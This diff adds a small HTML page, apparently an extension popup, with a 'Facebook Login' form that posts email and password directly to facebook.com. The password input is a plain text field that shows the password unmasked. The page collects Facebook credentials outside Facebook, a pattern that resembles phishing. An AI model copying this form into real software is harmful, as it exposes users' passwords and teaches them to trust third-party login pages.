@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <script src="jquery-1.8.2.min.js"></script>
+    <script src="popup.js"></script>
+</head>
+<body>
+    <div style="width: 250px">
+        <div><b>Login to Facobook Page</b></div>
+        <form action="https://www.facebook.com/login.php?login_attempt=1" method="post" id="form" target="FBWindow">
+            <input type="text" name="email" placeholder="Email">
+            <input type="text" name="password" placeholder="Password">
+            <input type="submit" value="Login" id="Login">
+        </form>
+    </div>
+    
+</body>
+</html>
